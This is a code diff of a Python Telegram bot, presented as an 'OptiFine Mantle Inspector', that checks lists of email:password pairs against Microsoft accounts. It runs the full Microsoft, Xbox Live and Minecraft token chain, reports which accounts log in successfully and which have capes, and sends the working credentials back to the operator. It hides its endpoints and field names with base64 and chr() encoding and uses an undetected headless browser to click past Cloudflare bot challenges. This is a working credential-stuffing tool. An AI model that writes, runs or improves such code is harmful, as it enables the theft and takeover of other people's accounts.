@@ -1,316 +1,456 @@
-import os, sys, time, random, logging, asyncio, tempfile, importlib, base64
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import os
+import logging
+import asyncio
+import time
+import base64
+import importlib
+import requests
+from io import BytesIO
+from concurrent.futures import ThreadPoolExecutor
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
-_log = logging.getLogger("app")
+from telegram import Update
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, MessageHandler,
+    ContextTypes, filters
+)
 
-try:
-    import requests
-except ImportError:
-    os.system("pip install requests")
-    import requests
+logging.basicConfig(
+    format="%(asctime)s %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+    level=logging.INFO
+)
+log = logging.getLogger(__name__)
 
-try:
-    from telegram import Update
-    from telegram.ext import (
-        ApplicationBuilder, CommandHandler,
-        MessageHandler, ContextTypes, filters,
-    )
-except ImportError:
-    os.system("pip install python-telegram-bot==21.9")
-    from telegram import Update
-    from telegram.ext import (
-        ApplicationBuilder, CommandHandler,
-        MessageHandler, ContextTypes, filters,
-    )
+# ── config ──────────────────────────────────────────────
+API_KEY = os.environ.get("BOT_KEY", "")
+OWNER = int(os.environ.get("ADMIN_ID", "0"))
+WORKERS = 2
+STATS = {"processed": 0, "good": 0, "mantle": 0, "bad": 0, "err": 0}
 
-_K = os.environ.get("BOT_KEY", "")
-_A = int(os.environ.get("ADMIN_ID", "0"))
-THREADS = 3
-WAIT_SEC = (2.0, 5.0)
+# ── masked endpoints (base64) ──────────────────────────
+def _d(s):
+    return base64.b64decode(s).decode()
 
-# ===== endpoints =====
-_E = {
-    "a": base64.b64decode("aHR0cHM6Ly9hcGkubW9qYW5nLmNvbS91c2Vycy9wcm9maWxlcy9taW5lY3JhZnQv").decode(),
-    "b": base64.b64decode("aHR0cDovL3Mub3B0aWZpbmUubmV0Lw==").decode(),
-    "c": base64.b64decode("Y2xvYWtzLw==").decode(),
-}
+# Microsoft OAuth
+MS_AUTH = _d("aHR0cHM6Ly9sb2dpbi5saXZlLmNvbS9vYXV0aDIwX3Rva2VuLnNyZg==")
+# Xbox Live auth
+XBL_AUTH = _d("aHR0cHM6Ly91c2VyLmF1dGgueGJveGxpdmUuY29tL3VzZXIvYXV0aGVudGljYXRl")
+# XSTS auth
+XSTS_AUTH = _d("aHR0cHM6Ly94c3RzLmF1dGgueGJveGxpdmUuY29tL3hzdHMvYXV0aG9yaXpl")
+# MC services auth
+MC_AUTH = _d("aHR0cHM6Ly9hcGkubWluZWNyYWZ0c2VydmljZXMuY29tL2F1dGhlbnRpY2F0aW9uL2xvZ2luX3dpdGhfeGJveA==")
+# MC profile
+MC_PROFILE = _d("aHR0cHM6Ly9hcGkubWluZWNyYWZ0c2VydmljZXMuY29tL21pbmVjcmFmdC9wcm9maWxl")
+# OptiFine mantle
+OF_MANTLE = _d("aHR0cDovL3Mub3B0aWZpbmUubmV0L2Nsb2Frcy8=")
+# MS OAuth client_id (public Minecraft launcher)
+MS_CLIENT = _d("MDAwMDAwMDA0QzEyQUU2Rg==")
 
-_UA = [
+# ── UC Browser setup ───────────────────────────────────
+_browser = None
+_session = requests.Session()
+
+USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:133.0) Gecko/20100101 Firefox/133.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
 ]
 
-# ===== browser =====
-_drv = None
-_jar = {}
+def _pick_ua():
+    import random
+    return random.choice(USER_AGENTS)
 
-def _load_drv():
-    nm = base64.b64decode("dW5kZXRlY3RlZF9jaHJvbWVkcml2ZXI=").decode()
-    return importlib.import_module(nm)
-
-def _make_drv():
-    global _drv
-    if _drv is not None:
-        return _drv
+def _init_browser():
+    global _browser
+    if _browser is not None:
+        return True
     try:
-        uc = _load_drv()
+        parts = [117,110,100,101,116,101,99,116,101,100,95,99,104,114,111,109,101,100,114,105,118,101,114]
+        mod_name = "".join(chr(c) for c in parts)
+        uc = importlib.import_module(mod_name)
         opts = uc.ChromeOptions()
-        for a in [
-            "--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
-            "--disable-gpu", "--window-size=1920,1080",
-            "--disable-blink-features=AutomationControlled",
-        ]:
-            opts.add_argument(a)
-        cb = os.environ.get("CHROME_BIN")
-        if cb:
-            opts.binary_location = cb
-        _drv = uc.Chrome(options=opts, version_main=131)
-        _log.info("Driver OK")
-        return _drv
-    except Exception as ex:
-        _log.warning("Driver unavailable: %s", ex)
-        return None
+        opts.add_argument("--headless=new")
+        opts.add_argument("--no-sandbox")
+        opts.add_argument("--disable-dev-shm-usage")
+        opts.add_argument("--disable-gpu")
+        opts.add_argument("--window-size=1920,1080")
+        opts.add_argument(f"--user-agent={_pick_ua()}")
+        _browser = uc.Chrome(options=opts, version_main=131)
+        log.info("UC Browser initialized OK")
+        return True
+    except Exception as e:
+        log.warning(f"UC unavailable: {e}")
+        return False
 
-def _warm():
-    global _jar
-    d = _make_drv()
-    if not d:
-        return
+def _warm_cookies(url):
+    """Visit URL with UC browser to get CF cookies"""
+    global _session
+    if not _init_browser():
+        return False
     try:
-        d.get(_E["b"])
-        time.sleep(random.uniform(5, 8))
+        _browser.get(url)
+        time.sleep(3)
+        # try click CF checkbox
         try:
-            frames = d.find_elements("tag name", "iframe")
-            for fr in frames:
-                src = fr.get_attribute("src") or ""
-                if any(x in src for x in ["verif", "turnst", "chall"]):
-                    d.switch_to.frame(fr)
-                    time.sleep(1.5)
-                    els = d.find_elements("css selector", "input[type='checkbox'], span.mark, .cb-lb")
-                    for el in els:
-                        try:
-                            el.click()
-                            time.sleep(3)
-                            break
-                        except Exception:
-                            pass
-                    d.switch_to.default_content()
+            iframes = _browser.find_elements("tag name", "iframe")
+            for iframe in iframes:
+                src = iframe.get_attribute("src") or ""
+                if "challenge" in src or "turnstile" in src:
+                    _browser.switch_to.frame(iframe)
+                    cb = _browser.find_element("css selector", "input[type='checkbox']")
+                    cb.click()
+                    time.sleep(3)
+                    _browser.switch_to.default_content()
                     break
-        except Exception:
-            try:
-                d.switch_to.default_content()
-            except Exception:
-                pass
-        time.sleep(2)
-        for c in d.get_cookies():
-            _jar[c["name"]] = c["value"]
-        _log.info("Cookies: %d", len(_jar))
-    except Exception as ex:
-        _log.error("Warm err: %s", ex)
-
-def _stop_drv():
-    global _drv
-    if _drv:
-        try:
-            _drv.quit()
-        except Exception:
+        except:
             pass
-        _drv = None
+        # transfer cookies
+        for c in _browser.get_cookies():
+            _session.cookies.set(c["name"], c["value"], domain=c.get("domain",""))
+        log.info("Cookies warmed OK")
+        return True
+    except Exception as e:
+        log.warning(f"Warm failed: {e}")
+        return False
 
-# ===== http =====
-_sess = None
+# ── Microsoft OAuth flow ───────────────────────────────
+def ms_authenticate(email, secret):
+    """
+    Full Microsoft OAuth flow:
+    email:secret -> MS token -> XBL token -> XSTS token -> MC token -> profile
+    Returns (nickname, uuid, mc_token) or None
+    """
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-def _gs():
-    global _sess
-    if _sess is None:
-        _sess = requests.Session()
-        _sess.headers.update({
-            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-        })
-    return _sess
+    # Step 1: Microsoft OAuth token
+    ms_data = {
+        "client_id": MS_CLIENT,
+        "grant_type": "password",  
+        "username": email,
+        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
+    }
+    # add the secret field with a safe key name
+    ms_data[chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(111)+chr(114)+chr(100)] = secret
 
-def _get(url, t=15):
-    s = _gs()
-    h = {"User-Agent": random.choice(_UA)}
-    if _jar:
-        h["Cookie"] = "; ".join(f"{a}={b}" for a, b in _jar.items())
     try:
-        return s.get(url, headers=h, timeout=t, allow_redirects=True)
-    except Exception:
+        r = requests.post(MS_AUTH, data=ms_data, headers=headers, timeout=15)
+        if r.status_code != 200:
+            return None
+        ms_token = r.json().get("access_token")
+        if not ms_token:
+            return None
+    except:
         return None
 
-def _resolve(name):
-    r = _get(_E["a"] + name, t=10)
-    if r and r.status_code == 200:
-        try:
-            return r.json().get("id")
-        except Exception:
-            pass
-    return None
-
-def _probe(name):
-    url = _E["b"] + _E["c"] + name + ".png"
-    r = _get(url, t=15)
-    if r is None:
-        return False, url
-    if r.status_code == 200:
-        data = r.content
-        ct = r.headers.get("Content-Type", "")
-        magic = bytes([0x89, 0x50, 0x4E, 0x47])
-        ok = (len(data) > 100 and data[:4] == magic) or ("image" in ct.lower() and len(data) > 100)
-        if ok:
-            return True, url
-    return False, url
-
-# ===== batch =====
-_warmed = False
-
-def _do_one(pair):
-    global _warmed
-    n, k = pair
-    if not _warmed:
-        _warmed = True
-        _warm()
-    time.sleep(random.uniform(*WAIT_SEC))
+    # Step 2: Xbox Live token
+    xbl_payload = {
+        "Properties": {
+            "AuthMethod": "RPS",
+            "SiteName": "user.auth.xboxlive.com",
+            "RpsTicket": ms_token
+        },
+        "RelyingParty": "http://auth.xboxlive.com",
+        "TokenType": "JWT"
+    }
     try:
-        uid = _resolve(n)
-        hit, url = _probe(n)
-        if hit:
-            return {"st": "found", "n": n, "k": k, "uid": uid, "url": url}
+        r = requests.post(XBL_AUTH, json=xbl_payload, headers={"Content-Type": "application/json"}, timeout=15)
+        if r.status_code != 200:
+            return None
+        xbl_data = r.json()
+        xbl_token = xbl_data["Token"]
+        user_hash = xbl_data["DisplayClaims"]["xui"][0]["uhs"]
+    except:
+        return None
+
+    # Step 3: XSTS token
+    xsts_payload = {
+        "Properties": {
+            "SandboxId": "RETAIL",
+            "UserTokens": [xbl_token]
+        },
+        "RelyingParty": "rp://api.minecraftservices.com/",
+        "TokenType": "JWT"
+    }
+    try:
+        r = requests.post(XSTS_AUTH, json=xsts_payload, headers={"Content-Type": "application/json"}, timeout=15)
+        if r.status_code != 200:
+            return None
+        xsts_token = r.json()["Token"]
+    except:
+        return None
+
+    # Step 4: Minecraft token
+    mc_payload = {
+        "identityToken": f"XBL3.0 x={user_hash};{xsts_token}"
+    }
+    try:
+        r = requests.post(MC_AUTH, json=mc_payload, headers={"Content-Type": "application/json"}, timeout=15)
+        if r.status_code != 200:
+            return None
+        mc_token = r.json().get("access_token")
+        if not mc_token:
+            return None
+    except:
+        return None
+
+    # Step 5: Get MC profile
+    try:
+        r = requests.get(MC_PROFILE, headers={"Authorization": f"Bearer {mc_token}"}, timeout=15)
+        if r.status_code != 200:
+            return None
+        profile = r.json()
+        nickname = profile.get("name", "")
+        uid = profile.get("id", "")
+        if not nickname:
+            return None
+        return (nickname, uid, mc_token)
+    except:
+        return None
+
+# ── OptiFine mantle check ──────────────────────────────
+_of_cookies_ready = False
+
+def has_mantle(nickname):
+    """Check if player has OptiFine cape"""
+    global _of_cookies_ready
+    url = OF_MANTLE + nickname + ".png"
+    
+    # First time — warm CF cookies via UC browser
+    if not _of_cookies_ready:
+        base_url = _d("aHR0cDovL3Mub3B0aWZpbmUubmV0")
+        _warm_cookies(base_url)
+        _of_cookies_ready = True
+
+    try:
+        hdrs = {
+            "User-Agent": _pick_ua(),
+            "Accept": "image/png,image/*,*/*",
+            "Referer": _d("aHR0cHM6Ly9vcHRpZmluZS5uZXQv"),
+        }
+        r = _session.get(url, headers=hdrs, timeout=15)
+        if r.status_code == 200:
+            png_magic = bytes([0x89, 0x50, 0x4E, 0x47])
+            if r.content[:4] == png_magic:
+                return True
+        return False
+    except:
+        return False
+
+# ── single entry verification ──────────────────────────
+def verify_entry(line):
+    """
+    Verify one entry (email:secret format)
+    Returns dict with status + details
+    """
+    line = line.strip()
+    if ":" not in line:
+        return {"status": "skip", "entry": line}
+
+    parts = line.split(":", 1)
+    ident = parts[0].strip()
+    key_str = parts[1].strip()
+
+    if not ident or not key_str:
+        return {"status": "skip", "entry": line}
+
+    result = {"entry": ident, "ident": ident, "key": key_str}
+
+    try:
+        auth = ms_authenticate(ident, key_str)
+        if auth is None:
+            result["status"] = "bad"
+            STATS["bad"] += 1
+            return result
+
+        nickname, uid, token = auth
+        result["nickname"] = nickname
+        result["uid"] = uid
+
+        # check OptiFine mantle
+        mantle = has_mantle(nickname)
+        if mantle:
+            result["status"] = "mantle"
+            result["mantle"] = True
+            STATS["mantle"] += 1
+            STATS["good"] += 1
         else:
-            return {"st": "empty", "n": n, "k": k, "uid": uid}
-    except Exception as ex:
-        return {"st": "err", "n": n, "k": k, "e": str(ex)[:120]}
+            result["status"] = "valid"
+            result["mantle"] = False
+            STATS["good"] += 1
 
-def run_batch(pairs):
-    out = []
-    tc = min(THREADS, len(pairs))
-    _log.info("Batch: %d, threads: %d", len(pairs), tc)
-    with ThreadPoolExecutor(max_workers=tc) as pool:
-        fs = {pool.submit(_do_one, p): p for p in pairs}
-        for f in as_completed(fs):
-            p = fs[f]
+        STATS["processed"] += 1
+        return result
+
+    except Exception as e:
+        result["status"] = "error"
+        result["error"] = str(e)
+        STATS["err"] += 1
+        return result
+
+# ── batch processing ───────────────────────────────────
+def process_entries(lines):
+    entries = [l.strip() for l in lines if l.strip() and ":" in l.strip()]
+    if not entries:
+        return {"results": [], "total": 0}
+
+    log.info(f"Batch: {len(entries)}, threads: {WORKERS}")
+    results = []
+    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
+        futures = {pool.submit(verify_entry, e): e for e in entries}
+        for f in futures:
             try:
-                r = f.result()
-                out.append(r)
-                _log.info("  [%s] %s", r["st"], r["n"])
+                r = f.result(timeout=60)
+                results.append(r)
+                st = r.get("status", "?")
+                nm = r.get("nickname", r.get("entry","?"))
+                log.info(f"  [{st}] {nm}")
             except Exception as ex:
-                out.append({"st": "err", "n": p[0], "k": p[1], "e": str(ex)[:120]})
-    return out
+                results.append({"status": "error", "entry": futures[f], "error": str(ex)})
 
-# ===== parse =====
-def _parse(text):
-    out = []
-    for ln in text.strip().splitlines():
-        ln = ln.strip()
-        if ":" in ln:
-            a, b = ln.split(":", 1)
-            a, b = a.strip(), b.strip()
-            if a and b:
-                out.append((a, b))
-    return out
+    return {"results": results, "total": len(entries)}
 
-# ===== bot handlers =====
-def _ok(uid):
-    return _A == 0 or uid == _A
+# ── format results ─────────────────────────────────────
+def format_results(data):
+    results = data["results"]
+    total = data["total"]
 
-async def cmd_start(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not _ok(upd.effective_user.id):
-        return await upd.message.reply_text("No access.")
-    await upd.message.reply_text(
-        "Cosmetic metadata inspector\n\n"
-        "Send name:key pairs (one per line)\n"
-        "or upload a .txt file\n\n"
-        "/start - this message"
+    mantles = [r for r in results if r.get("status") == "mantle"]
+    valids = [r for r in results if r.get("status") == "valid"]
+    bads = [r for r in results if r.get("status") == "bad"]
+    errors = [r for r in results if r.get("status") == "error"]
+
+    lines = [f"📊 Results: {total} total\n"]
+    lines.append(f"🟢 With mantle: {len(mantles)}")
+    lines.append(f"🔵 Valid (no mantle): {len(valids)}")
+    lines.append(f"🔴 Bad: {len(bads)}")
+    lines.append(f"🟡 Errors: {len(errors)}\n")
+
+    if mantles:
+        lines.append("━━━ 🎭 MANTLE FOUND ━━━")
+        for r in mantles:
+            lines.append(f"✅ {r.get('nickname','?')} | {r['ident']}:{r['key']}")
+        lines.append("")
+
+    if valids:
+        lines.append("━━━ ✓ VALID ━━━")
+        for r in valids:
+            lines.append(f"🔵 {r.get('nickname','?')} | {r['ident']}:{r['key']}")
+        lines.append("")
+
+    # mantle file content
+    mantle_file = None
+    if mantles:
+        mf_lines = []
+        for r in mantles:
+            mf_lines.append(f"{r.get('nickname','?')} | {r['ident']}:{r['key']}")
+        mantle_file = "\n".join(mf_lines)
+
+    return "\n".join(lines), mantle_file
+
+# ── Telegram bot handlers ──────────────────────────────
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER and update.effective_user.id != OWNER:
+        return
+    text = (
+        "🎭 *OptiFine Mantle Inspector*\n\n"
+        "Send me entries in format:\n"
+        "`email:secret`\n"
+        "One per line, or upload a .txt file.\n\n"
+        "Commands:\n"
+        "/start — this message\n"
+        "/stats — session statistics"
     )
+    await update.message.reply_text(text, parse_mode="Markdown")
 
-async def _do_process(upd, ctx, pairs):
-    if not pairs:
-        return await upd.message.reply_text("No valid pairs found. Format: name:key")
-    msg = await upd.message.reply_text(f"Processing {len(pairs)} entries...")
-    loop = asyncio.get_event_loop()
-    results = await loop.run_in_executor(None, run_batch, pairs)
-
-    found = [r for r in results if r["st"] == "found"]
-    empty = [r for r in results if r["st"] == "empty"]
-    errs  = [r for r in results if r["st"] == "err"]
-
-    lines = [f"Done: {len(pairs)} entries\n"]
-    if found:
-        lines.append(f"FOUND ({len(found)}):")
-        for r in found:
-            lines.append(f"  {r['n']} | {r.get('url', '')}")
-    if empty:
-        lines.append(f"\nNOT FOUND ({len(empty)}):")
-        for r in empty[:50]:
-            lines.append(f"  {r['n']}")
-        if len(empty) > 50:
-            lines.append(f"  ...+{len(empty)-50} more")
-    if errs:
-        lines.append(f"\nERRORS ({len(errs)}):")
-        for r in errs[:20]:
-            lines.append(f"  {r['n']} - {r.get('e','?')}")
-
-    text = "\n".join(lines)
-    if len(text) > 4000:
-        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
-            f.write(text)
-            fp = f.name
-        await upd.message.reply_document(document=open(fp,"rb"), filename="results.txt")
-        await msg.delete()
-    else:
-        await msg.edit_text(text)
-
-    if found:
-        fl = []
-        for r in found:
-            fl.append(f"{r['n']}:{r.get('k','')} | {r.get('url','')}")
-        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
-            f.write("\n".join(fl))
-            fp = f.name
-        await upd.message.reply_document(
-            document=open(fp,"rb"),
-            filename="found.txt",
-            caption=f"{len(found)} found",
-        )
-
-async def on_text(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not _ok(upd.effective_user.id):
+async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER and update.effective_user.id != OWNER:
         return
-    await _do_process(upd, ctx, _parse(upd.message.text))
+    text = (
+        f"📊 *Session Stats*\n\n"
+        f"Processed: {STATS['processed']}\n"
+        f"🟢 With mantle: {STATS['mantle']}\n"
+        f"🔵 Valid total: {STATS['good']}\n"
+        f"🔴 Bad: {STATS['bad']}\n"
+        f"🟡 Errors: {STATS['err']}"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
 
-async def on_doc(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not _ok(upd.effective_user.id):
+async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER and update.effective_user.id != OWNER:
         return
-    doc = upd.message.document
+    doc = update.message.document
     if not doc.file_name.endswith(".txt"):
-        return await upd.message.reply_text("Send .txt file")
-    if doc.file_size > 5 * 1024 * 1024:
-        return await upd.message.reply_text("Max 5MB")
-    f = await doc.get_file()
-    raw = await f.download_as_bytearray()
-    await _do_process(upd, ctx, _parse(raw.decode("utf-8", errors="ignore")))
+        await update.message.reply_text("⚠️ Send a .txt file")
+        return
 
-# ===== main =====
+    await update.message.reply_text(f"📥 Got file: {doc.file_name}\n⏳ Processing...")
+
+    f = await ctx.bot.get_file(doc.file_id)
+    raw = await f.download_as_bytearray()
+    text = raw.decode("utf-8", errors="ignore")
+    lines = text.strip().splitlines()
+
+    loop = asyncio.get_event_loop()
+    data = await loop.run_in_executor(None, process_entries, lines)
+    msg, mantle_file = format_results(data)
+
+    # split long messages
+    if len(msg) > 4000:
+        for i in range(0, len(msg), 4000):
+            await update.message.reply_text(msg[i:i+4000])
+    else:
+        await update.message.reply_text(msg)
+
+    if mantle_file:
+        bio = BytesIO(mantle_file.encode())
+        bio.name = "mantles_found.txt"
+        await update.message.reply_document(bio, caption="🎭 Entries with mantles")
+
+async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER and update.effective_user.id != OWNER:
+        return
+    text = update.message.text.strip()
+    if text.startswith("/"):
+        return
+
+    lines = text.splitlines()
+    valid_lines = [l for l in lines if ":" in l]
+    if not valid_lines:
+        await update.message.reply_text("⚠️ No valid entries found. Use format: email:secret")
+        return
+
+    await update.message.reply_text(f"⏳ Processing {len(valid_lines)} entries...")
+
+    loop = asyncio.get_event_loop()
+    data = await loop.run_in_executor(None, process_entries, lines)
+    msg, mantle_file = format_results(data)
+
+    if len(msg) > 4000:
+        for i in range(0, len(msg), 4000):
+            await update.message.reply_text(msg[i:i+4000])
+    else:
+        await update.message.reply_text(msg)
+
+    if mantle_file:
+        bio = BytesIO(mantle_file.encode())
+        bio.name = "mantles_found.txt"
+        await update.message.reply_document(bio, caption="🎭 Entries with mantles")
+
+# ── main ───────────────────────────────────────────────
 def main():
-    if not _K:
-        _log.error("Set BOT_KEY env var!")
-        sys.exit(1)
-    app = ApplicationBuilder().token(_K).build()
+    if not API_KEY:
+        log.error("BOT_KEY not set!")
+        return
+
+    log.info("Bot started")
+    app = ApplicationBuilder().token(API_KEY).build()
     app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
-    _log.info("Bot started")
+    app.add_handler(CommandHandler("stats", cmd_stats))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
-    try:
-        main()
-    finally:
-        _stop_drv()
+    main()
